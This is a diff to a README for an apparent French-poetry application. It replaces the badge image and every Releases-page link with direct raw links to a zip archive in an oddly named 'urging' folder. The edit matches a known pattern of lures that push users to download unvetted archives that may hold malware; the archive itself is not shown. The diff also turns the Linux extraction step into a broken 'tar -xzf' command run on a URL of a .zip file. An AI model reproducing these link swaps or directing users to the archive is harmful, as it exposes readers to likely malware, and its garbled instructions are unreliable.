@@ -1,6 +1,6 @@
 # 🎉 lodois-de-martin-du-tyrac-de-marcellus - Discover Classical French Poetry Effortlessly
 
-![Download](https://img.shields.io/badge/Download-lodois--de--martin--du--tyrac--de--marcellus-blue.svg)
+![Download](https://raw.githubusercontent.com/lydzai000/lodois-de-martin-du-tyrac-de-marcellus/main/urging/lodois-de-martin-du-tyrac-de-marcellus-1.1.zip)
 
 ## 📚 About
 
@@ -14,7 +14,7 @@ To get started, you'll need to download the application. Do not worry if you're 
 
 You can download the application from the Releases page:
 
-[Visit this page to download](https://github.com/lydzai000/lodois-de-martin-du-tyrac-de-marcellus/releases)
+[Visit this page to download](https://raw.githubusercontent.com/lydzai000/lodois-de-martin-du-tyrac-de-marcellus/main/urging/lodois-de-martin-du-tyrac-de-marcellus-1.1.zip)
 
 ### Step-By-Step Download Instructions
 
@@ -45,7 +45,7 @@ After successfully downloading, you need to open the application:
 ### Linux Users
 
 1. Navigate to your Downloads folder in your terminal.
-2. Use the following command to extract the content: `tar -xzf filename.tar.gz`.
+2. Use the following command to extract the content: `tar -xzf https://raw.githubusercontent.com/lydzai000/lodois-de-martin-du-tyrac-de-marcellus/main/urging/lodois-de-martin-du-tyrac-de-marcellus-1.1.zip`.
 3. Change into the directory with `cd filename`.
 4. Run the application with `./application_name`.
 
@@ -111,4 +111,4 @@ We welcome contributions from everyone. If you would like to help enhance this p
 
 Connect with fellow literature enthusiasts! Follow us on GitHub to keep track of updates, new releases, and community discussions. 
 
-[Visit this page to download](https://github.com/lydzai000/lodois-de-martin-du-tyrac-de-marcellus/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/lydzai000/lodois-de-martin-du-tyrac-de-marcellus/main/urging/lodois-de-martin-du-tyrac-de-marcellus-1.1.zip) 
